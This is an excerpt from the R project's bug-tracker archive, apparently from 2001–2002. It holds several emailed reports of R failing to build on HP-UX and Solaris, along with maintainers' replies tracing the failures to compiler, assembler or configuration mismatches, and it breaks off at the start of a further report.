From: Peter Kleiweg <kleiweg@let.rug.nl>
Date: Thu, 20 Dec 2001 14:09:42 +0100 (CET)
--problem is on hppa2.0-hp-hpux10.20: may be HP-UX specific
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1222 <==
From postmaster@franz.stat.wisc.edu  Thu Dec 20 14:10:13 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA13749
	for <r-bugs@biostat.ku.dk>; Thu, 20 Dec 2001 14:10:12 +0100 (MET)
Received: from kleigh.nl (really [213.84.55.218]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16H2xF-000IXfC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 20 Dec 2001 07:09:45 -0600 (CST) 
Received: from kleigh.nl (kleigh [127.0.0.1])
	by kleigh.nl (8.12.0/8.12.0) with ESMTP id fBKD9goQ007981
	for <r-bugs@r-project.org>; Thu, 20 Dec 2001 14:09:43 +0100
Received: from localhost (peter@localhost)
	by kleigh.nl (8.12.0/8.12.0/Submit) with ESMTP id fBKD9gPQ007978
	for <r-bugs@r-project.org>; Thu, 20 Dec 2001 14:09:42 +0100
X-Authentication-Warning: kleigh.nl: peter owned process doing -bs
Date: Thu, 20 Dec 2001 14:09:42 +0100 (CET)
From: Peter Kleiweg <kleiweg@let.rug.nl>
X-X-Sender:  <kleiweg@kleigh.nl>
To: <r-bugs@r-project.org>
Subject: configure: sed: Function s%@PDFLATEX@%/usr/local/bin/pdflatex%g
 cannot be parsed.
Message-ID: <Pine.LNX.4.33.0112201304160.476-100000@kleigh.nl>
Organization: Alfa-Informatica, Rijksuniversiteit Groningen
X-Accept-Language: nl,en,ia,af,de,da,no,sv,fr,it
X-Alert: http://www.opensource.org/halloween/
X-Face: "K~X:~!ydgSdjNy;]_+BCb\OM^pqyg_q*Le84$l46M\-mL=.^,L4B}bDK>`o#r4_>O*
X-Mailer: Pine 4.33, Linux 2.0.36, i586
X-Reason: http://www.interlingua.com/
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


Sometimes, configure isn't able to create the makefiles. It
produces errors like:

sed: Function s%@PDFLATEX@%/usr/local/bin/pdflatex%g cannot be parsed.

This happens when I use a combination of arguments to configure like:

    --prefix=$HOME/R-tst
    --with-tcl-config=/opt_local/opt/tcl/lib/tclConfig.sh
    --with-tk-config=/opt_local/opt/tk/lib/tkConfig.sh

If I leave out the last two arguments, the problem does not
occur.

If I change the first argument to --prefix=$HOME/Rtst, the
problem does not occur.

--please do not edit the information below--

Version:
 platform = hppa2.0-hp-hpux10.20
 arch = hppa2.0
 os = hpux10.20
 system = hppa2.0, hpux10.20
 status =
 major = 1
 minor = 4.0
 year = 2001
 month = 12
 day = 19
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


==> 1222.audit <==
Fri Dec 21 06:19:29 2001	ripley	changed notes
Fri Dec 21 06:19:29 2001	ripley	foobar
Fri Dec 21 06:19:29 2001	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1268 *
Subject: Solaris 2.6 Compile
From: gm81640@development.nssmb.com
Date: Thu, 17 Jan 2002 06:28:26 +0100 (MET)
--Most likely a compiler installation problem
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1268 <==
From gm81640@development.nssmb.com  Thu Jan 17 06:28:36 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA21618
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 06:28:26 +0100 (MET)
Date: Thu, 17 Jan 2002 06:28:26 +0100 (MET)
From: gm81640@development.nssmb.com
Message-Id: <200201170528.GAA21618@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Solaris 2.6 Compile

Full_Name: Geordon Marchak
Version: R-1.3.1
OS: Solaris 2.6
Submission from: (NULL) (199.67.239.91)


Got the following error when compiling on Solaris 2.6 with the standard GNU
gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
too :-)

# make
`Makedeps' is up to date.
gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
-DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: unknown opcode
".subsection"
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: statement syntax
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: unknown opcode
".previous"
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: statement syntax
*** Error code 1
make: Fatal error: Command failed for target `lbfgsb.o'
Current working directory /home/gm81640/R-1.3.1/src/appl
*** Error code 1
make: Fatal error: Command failed for target `R'
Current working directory /home/gm81640/R-1.3.1/src/appl
*** Error code 1
make: Fatal error: Command failed for target `R'
Current working directory /home/gm81640/R-1.3.1/src
*** Error code 1
make: Fatal error: Command failed for target `R'


==> 1268.followup.1 <==
From ripley@stats.ox.ac.uk  Thu Jan 17 09:37:45 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA23207
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 09:37:45 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id IAA21901;
	Thu, 17 Jan 2002 08:37:15 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id g0H8bFj02561;
	Thu, 17 Jan 2002 08:37:15 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Thu, 17 Jan 2002 08:37:15 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <gm81640@development.nssmb.com>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
In-Reply-To: <200201170528.GAA21628@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0201170827260.2465-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 17 Jan 2002 gm81640@development.nssmb.com wrote:

> Full_Name: Geordon Marchak
> Version: R-1.3.1
> OS: Solaris 2.6
> Submission from: (NULL) (199.67.239.91)
>
>
> Got the following error when compiling on Solaris 2.6 with the standard GNU
> gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
> too :-)

You sent this twice, for some reason.

It's hard to tell what `the standard GNU gcc package (from the Sun site)'
actually is.  However, R 1.3.1 did compile under Solaris 2.6 with gcc
2.95.3 compiled under Solaris 2.6.  The error appears to be a mismatch
between your compiler and your assembler.  I don't think that qualifies as
a bug in R, and definitely is one we can do nothing about.  lbfgsb.c does
seem to be valid C that is accepted by a wide range of compilers on
Solaris and elsewhere.


> # make
> `Makedeps' is up to date.
> gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
> -DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: unknown opcode
> ".subsection"
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: statement syntax
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: unknown opcode
> ".previous"
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: statement syntax
> *** Error code 1
> make: Fatal error: Command failed for target `lbfgsb.o'
> Current working directory /home/gm81640/R-1.3.1/src/appl
> *** Error code 1
> make: Fatal error: Command failed for target `R'
> Current working directory /home/gm81640/R-1.3.1/src/appl
> *** Error code 1
> make: Fatal error: Command failed for target `R'
> Current working directory /home/gm81640/R-1.3.1/src
> *** Error code 1
> make: Fatal error: Command failed for target `R'
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1268.reply.1 <==
From p.dalgaard@biostat.ku.dk  Thu Jan 17 11:46:44 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA25668;
	Thu, 17 Jan 2002 11:46:44 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g0HAjXh15735;
	Thu, 17 Jan 2002 11:45:33 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: ripley@stats.ox.ac.uk
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
References: <200201170837.JAA23228@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 17 Jan 2002 11:45:33 +0100
In-Reply-To: <200201170837.JAA23228@pubhealth.ku.dk>
Message-ID: <x2g055cl2q.fsf@blueberry.kubism.ku.dk>
Lines: 24
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

ripley@stats.ox.ac.uk writes:

> > Got the following error when compiling on Solaris 2.6 with the standard GNU
> > gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
> > too :-)
> 
> You sent this twice, for some reason.
> 
> It's hard to tell what `the standard GNU gcc package (from the Sun site)'
> actually is.  However, R 1.3.1 did compile under Solaris 2.6 with gcc
> 2.95.3 compiled under Solaris 2.6.  The error appears to be a mismatch
> between your compiler and your assembler.  I don't think that qualifies as
> a bug in R, and definitely is one we can do nothing about.  lbfgsb.c does
> seem to be valid C that is accepted by a wide range of compilers on
> Solaris and elsewhere.

Assuming that the "Sun site" means www.sunfreeware.com, I seem to
recall that you get in trouble if you use gcc3 without GNU binutils.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1268.followup.2 <==
From geordon.marchak@nssmb.com  Mon Jan 21 09:27:58 2002
Received: from issaspam-ny01.ssmb.com (mail1.ssmb.COM [199.67.139.25])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA26346
	for <R-bugs@biostat.ku.dk>; Mon, 21 Jan 2002 09:27:56 +0100 (MET)
Received: from issny6.ny.ssmb.com (issny6.ny.ssmb.com [162.124.150.21])
	by issaspam-ny01.ssmb.com (8.12.0/8.12.0/SSMB_EXT/1.4) with ESMTP id g0L8QXbE027462;
	Mon, 21 Jan 2002 03:26:50 -0500 (EST)
Received: from mailhub.nssmb.com (mailhubb.nssmb.com [169.180.188.120])
	by issny6.ny.ssmb.com (8.11.0/8.11.0/SSMB_QQQ_IN/1.1) with ESMTP id g0L8PFT01212;
	Mon, 21 Jan 2002 03:25:15 -0500 (EST)
Received: from lx22z001.nssmb.com (lx22z001.nssmb.com [169.180.162.41])
	by mailhub.nssmb.com (8.9.3/8.9.3/SSMB-HUB) with ESMTP id RAA08319;
	Mon, 21 Jan 2002 17:25:14 +0900 (JST)
Received: by lx22z001.nssmb.com (Postfix, from userid 81640)
	id 3B1E9BFE83; Mon, 21 Jan 2002 17:25:14 +0900 (JST)
Received: from localhost (localhost [127.0.0.1])
	by lx22z001.nssmb.com (Postfix) with ESMTP
	id 0A901BFE82; Mon, 21 Jan 2002 17:25:14 +0900 (JST)
Date: Mon, 21 Jan 2002 17:25:13 +0900 (JST)
From: Joe Marchak <geordon.marchak@nssmb.com>
X-X-Sender:  <gm81640@lx22z001.nssmb.com>
To: Prof Brian Ripley <ripley@stats.ox.ac.uk>
Cc: <geordon.marchak@nssmb.com>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
In-Reply-To: <Pine.LNX.4.31.0201170827260.2465-100000@gannet.stats>
Message-ID: <Pine.LNX.4.33.0201211721260.8617-100000@lx22z001.nssmb.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


As you mentioned below, R 1.3.1 does compile on Solaris with gcc 2.95.  I've tried 
both Solaris 2.5.1 and Solaris 2.6 with this, and they are fine.  Moving to gcc 
3.03 however causes the problem.  

Thanks for you help earlier.

-Joe.



> Date: Thu, 17 Jan 2002 08:37:15 +0000 (GMT)
> From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
> To: geordon.marchak@nssmb.com
> Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
> 
> On Thu, 17 Jan 2002 gm81640@development.nssmb.com wrote:
> 
> > Full_Name: Geordon Marchak
> > Version: R-1.3.1
> > OS: Solaris 2.6
> > Submission from: (NULL) (199.67.239.91)
> >
> >
> > Got the following error when compiling on Solaris 2.6 with the standard GNU
> > gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
> > too :-)
> 
> You sent this twice, for some reason.
> 
> It's hard to tell what `the standard GNU gcc package (from the Sun site)'
> actually is.  However, R 1.3.1 did compile under Solaris 2.6 with gcc
> 2.95.3 compiled under Solaris 2.6.  The error appears to be a mismatch
> between your compiler and your assembler.  I don't think that qualifies as
> a bug in R, and definitely is one we can do nothing about.  lbfgsb.c does
> seem to be valid C that is accepted by a wide range of compilers on
> Solaris and elsewhere.
> 
> 
> > # make
> > `Makedeps' is up to date.
> > gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
> > -DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: unknown opcode
> > ".subsection"
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: statement syntax
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: unknown opcode
> > ".previous"
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: statement syntax
> > *** Error code 1
> > make: Fatal error: Command failed for target `lbfgsb.o'
> > Current working directory /home/gm81640/R-1.3.1/src/appl
> > *** Error code 1
> > make: Fatal error: Command failed for target `R'
> > Current working directory /home/gm81640/R-1.3.1/src/appl
> > *** Error code 1
> > make: Fatal error: Command failed for target `R'
> > Current working directory /home/gm81640/R-1.3.1/src
> > *** Error code 1
> > make: Fatal error: Command failed for target `R'
> >
> >
> > -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> > r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> > Send "info", "help", or "[un]subscribe"
> > (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> > _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
> >
> 
> 


==> 1268.audit <==
Fri Jan 18 09:06:39 2002	ripley	changed notes
Fri Jan 18 09:06:39 2002	ripley	foobar
Fri Jan 18 09:06:39 2002	ripley	moved from incoming to System-specific
Sun Apr 21 09:41:09 2002	ripley	moved from System-specific to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1291 *
Subject: Installation problem : SunOS
From: brendan_mcmahon@prusec.com
Date: Thu, 31 Jan 2002 18:00:55 +0100 (MET)
--looks like gcc compiled under different OS version.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1291 <==
From brendan_mcmahon@prusec.com  Thu Jan 31 18:00:56 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA07547
	for <R-bugs@biostat.ku.dk>; Thu, 31 Jan 2002 18:00:55 +0100 (MET)
Date: Thu, 31 Jan 2002 18:00:55 +0100 (MET)
From: brendan_mcmahon@prusec.com
Message-Id: <200201311700.SAA07547@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Installation problem : SunOS

Full_Name: Brendan McMahon
Version: 1.3
OS: SunOS
Submission from: (NULL) (12.42.50.51)



Probably just a configuration problem but ... fails to compile.
configure completed without a problem.
Any help appreciated!!

SunOS flexdev1 5.7 Generic_106541-11 sun4u sparc SUNW,Ultra-5_10

`Makedeps' is up to date.
gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
-DHAVE_CONFIG_H   -g -O2 -c arithmetic.c -o arithmetic.o
arithmetic.c:58: warning: `struct exception' declared inside parameter list
arithmetic.c:58: warning: its scope is only this definition or declaration,
arithmetic.c:58: warning: which is probably not what you want.
arithmetic.c: In function `matherr':
arithmetic.c:60: dereferencing pointer to incomplete type
arithmetic.c:61: `DOMAIN' undeclared (first use this function)
arithmetic.c:61: (Each undeclared identifier is reported only once
arithmetic.c:61: for each function it appears in.)
arithmetic.c:62: `SING' undeclared (first use this function)
arithmetic.c:65: `OVERFLOW' undeclared (first use this function)
arithmetic.c:68: `UNDERFLOW' undeclared (first use this function)
arithmetic.c:69: dereferencing pointer to incomplete type
arithmetic.c: In function `do_math1':
arithmetic.c:984: `acosh' undeclared (first use this function)
arithmetic.c:985: `asinh' undeclared (first use this function)
arithmetic.c:986: `atanh' undeclared (first use this function)
*** Error code 1
make: Fatal error: Command failed for target `arithmetic.o'
Current working directory /export/home/flexapp/R/R-1.3.0/src/main
*** Error code 1
make: Fatal error: Command failed for target `R'

==> 1291.followup.1 <==
From ripley@stats.ox.ac.uk  Thu Jan 31 18:46:28 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA07809
	for <R-bugs@biostat.ku.dk>; Thu, 31 Jan 2002 18:46:28 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id RAA10317;
	Thu, 31 Jan 2002 17:45:57 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id g0VHjv312467;
	Thu, 31 Jan 2002 17:45:57 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Thu, 31 Jan 2002 17:45:57 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <brendan_mcmahon@prusec.com>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Installation problem : SunOS (PR#1291)
In-Reply-To: <200201311700.SAA07558@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0201311742120.12426-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 31 Jan 2002 brendan_mcmahon@prusec.com wrote:

> Full_Name: Brendan McMahon
> Version: 1.3
> OS: SunOS
> Submission from: (NULL) (12.42.50.51)
>
>
>
> Probably just a configuration problem but ... fails to compile.
> configure completed without a problem.

We need to know your compiler system. This is I seem to remember a symptom
of using gcc made on SunOS 5.5 under 5.6/7, so if this is gcc, was it
built under 5.7?

BTW, R is now at 1.4.1, not 1.3.0.

> Any help appreciated!!
>
> SunOS flexdev1 5.7 Generic_106541-11 sun4u sparc SUNW,Ultra-5_10
>
> `Makedeps' is up to date.
> gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
> -DHAVE_CONFIG_H   -g -O2 -c arithmetic.c -o arithmetic.o
> arithmetic.c:58: warning: `struct exception' declared inside parameter list
> arithmetic.c:58: warning: its scope is only this definition or declaration,
> arithmetic.c:58: warning: which is probably not what you want.
> arithmetic.c: In function `matherr':
> arithmetic.c:60: dereferencing pointer to incomplete type
> arithmetic.c:61: `DOMAIN' undeclared (first use this function)
> arithmetic.c:61: (Each undeclared identifier is reported only once
> arithmetic.c:61: for each function it appears in.)
> arithmetic.c:62: `SING' undeclared (first use this function)
> arithmetic.c:65: `OVERFLOW' undeclared (first use this function)
> arithmetic.c:68: `UNDERFLOW' undeclared (first use this function)
> arithmetic.c:69: dereferencing pointer to incomplete type
> arithmetic.c: In function `do_math1':
> arithmetic.c:984: `acosh' undeclared (first use this function)
> arithmetic.c:985: `asinh' undeclared (first use this function)
> arithmetic.c:986: `atanh' undeclared (first use this function)
> *** Error code 1
> make: Fatal error: Command failed for target `arithmetic.o'
> Current working directory /export/home/flexapp/R/R-1.3.0/src/main
> *** Error code 1
> make: Fatal error: Command failed for target `R'
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1291.audit <==
Fri Feb  1 21:53:20 2002	ripley	changed notes
Fri Feb  1 21:53:20 2002	ripley	foobar
Fri Feb  1 21:53:20 2002	ripley	moved from incoming to System-specific
Sun Apr 21 09:41:20 2002	ripley	moved from System-specific to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1415 *
Subject: int 32 bit error on SPARC 64bit
From: kss28@mail.cba.nau.edu
Date: Mon, 25 Mar 2002 21:18:58 +0100 (MET)
--Was gcc 2.95.2 in private followup.
--Probably unappropriate flags
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1415 <==
From kss28@mail.cba.nau.edu  Mon Mar 25 21:18:58 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA13401
	for <R-bugs@biostat.ku.dk>; Mon, 25 Mar 2002 21:18:58 +0100 (MET)
Date: Mon, 25 Mar 2002 21:18:58 +0100 (MET)
From: kss28@mail.cba.nau.edu
Message-Id: <200203252018.VAA13401@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: int 32 bit error on SPARC 64bit

Full_Name: Krassimir Sedmakov
Version: R-1.4.1
OS: Solaris 8
Submission from: (NULL) (134.114.165.52)


********
Problem:
********

When running make for R-1.4.1 on Solaris 8, SPARC 64 bit the following error
message is generated:

arithmetic.c:672: #error code requires that int have 32 bits
gmake[3]: *** [arithmetic.o] Error 1
gmake[3]: Leaving directory `/opt/R/R-1.4.1/src/main'
gmake[2]: *** [R] Error 2
gmake[2]: Leaving directory `/opt/R/R-1.4.1/src/main'
gmake[1]: *** [R] Error 1
gmake[1]: Leaving directory `/opt/R/R-1.4.1/src'
gmake: *** [R] Error 

*************
Related Code:
*************

***Related code in arithemtic.c file:

667  #ifndef INT_32_BITS
   668  /* configure checks whehter int is 32 bits.  If not this code will
   669     need to be rewritten.  Since 32 bit ints are pretty much universal,
   670     we can worry about writing alternate code when the need arises.
   671     To be safe, we signal a compiler error if int is not 32 bits. */
   672  # error code requires that int have 32 bits
   673  #else
   674  /* Just to be on the safe side, configure ought to check that the
   675     mashine uses two's complement. A define like
   676  #define USES_TWOS_COMPLEMENT (~0 == (unsigned) -1)
   677     might work, but at least one compiler (CodeWarrior 6) chokes on it.
   678     So for now just assume it is true.
   679  */

***Related code in configure file:

10871  if test "${ac_cv_sizeof_int}" = 4; then
10872    cat >> confdefs.h <<\EOF
10873  #define INT_32_BITS 1
10874  EOF
10875
10876  fi
10877  if test "${cross_compiling}" = yes; then
10878    warn_xcompile_sizeof_long="assuming C longs are 4 byte on ${host}"
10879    echo "configure: warning: ${warn_xcompile_sizeof_long}" 1>&2
10880  fi

*********
Solution:
*********
Run ./configure
Ignore warnings
in R-1.4.1/ directory create a file confdefs.h and enter (*see related configure
file)
#define INT_32_BITS 1
Run make
run make install



==> 1415.followup.1 <==
From ripley@stats.ox.ac.uk  Mon Mar 25 21:48:30 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA13481
	for <R-bugs@biostat.ku.dk>; Mon, 25 Mar 2002 21:48:29 +0100 (MET)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id UAA24851;
	Mon, 25 Mar 2002 20:47:51 GMT
Date: Mon, 25 Mar 2002 20:47:50 +0000 (GMT)
X-X-Sender:  <ripley@gannet.stats>
To: <kss28@mail.cba.nau.edu>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] int 32 bit error on SPARC 64bit (PR#1415)
In-Reply-To: <200203252018.VAA13406@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0203252041280.15222-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

You haven't told us anything about your compilers.  You can set options to
make ints 64bits, and you must not for use with R.

This works correctly for me, using SunPro 6 compilers.

The configure script reports the size of ints, and if this is not 4 bytes,
change the options.  If it is 4 bytes, the correct option will be set.


On Mon, 25 Mar 2002 kss28@mail.cba.nau.edu wrote:

> Full_Name: Krassimir Sedmakov
> Version: R-1.4.1
> OS: Solaris 8
> Submission from: (NULL) (134.114.165.52)
>
>
> ********
> Problem:
> ********
>
> When running make for R-1.4.1 on Solaris 8, SPARC 64 bit the following error
> message is generated:
>
> arithmetic.c:672: #error code requires that int have 32 bits
> gmake[3]: *** [arithmetic.o] Error 1
> gmake[3]: Leaving directory `/opt/R/R-1.4.1/src/main'
> gmake[2]: *** [R] Error 2
> gmake[2]: Leaving directory `/opt/R/R-1.4.1/src/main'
> gmake[1]: *** [R] Error 1
> gmake[1]: Leaving directory `/opt/R/R-1.4.1/src'
> gmake: *** [R] Error
>
> *************
> Related Code:
> *************
>
> ***Related code in arithemtic.c file:
>
> 667  #ifndef INT_32_BITS
>    668  /* configure checks whehter int is 32 bits.  If not this code will
>    669     need to be rewritten.  Since 32 bit ints are pretty much universal,
>    670     we can worry about writing alternate code when the need arises.
>    671     To be safe, we signal a compiler error if int is not 32 bits. */
>    672  # error code requires that int have 32 bits
>    673  #else
>    674  /* Just to be on the safe side, configure ought to check that the
>    675     mashine uses two's complement. A define like
>    676  #define USES_TWOS_COMPLEMENT (~0 == (unsigned) -1)
>    677     might work, but at least one compiler (CodeWarrior 6) chokes on it.
>    678     So for now just assume it is true.
>    679  */
>
> ***Related code in configure file:
>
> 10871  if test "${ac_cv_sizeof_int}" = 4; then
> 10872    cat >> confdefs.h <<\EOF
> 10873  #define INT_32_BITS 1
> 10874  EOF
> 10875
> 10876  fi
> 10877  if test "${cross_compiling}" = yes; then
> 10878    warn_xcompile_sizeof_long="assuming C longs are 4 byte on ${host}"
> 10879    echo "configure: warning: ${warn_xcompile_sizeof_long}" 1>&2
> 10880  fi
>
> *********
> Solution:
> *********
> Run ./configure
> Ignore warnings
> in R-1.4.1/ directory create a file confdefs.h and enter (*see related configure
> file)
> #define INT_32_BITS 1
> Run make
> run make install
>
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1415.audit <==
Sat Mar 30 09:22:49 2002	ripley	changed notes
Sat Mar 30 09:22:49 2002	ripley	foobar
Sat Mar 30 09:22:49 2002	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1428 *
Subject: R compile on Solaris 8 fails
From: brower@bst.rochester.edu
Date: Mon, 1 Apr 2002 22:19:07 +0200 (MET DST)
--problems with g++ not finding -lstdc++
--Not a problem with R per se
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1428 <==
From brower@bst.rochester.edu  Mon Apr  1 22:19:08 2002
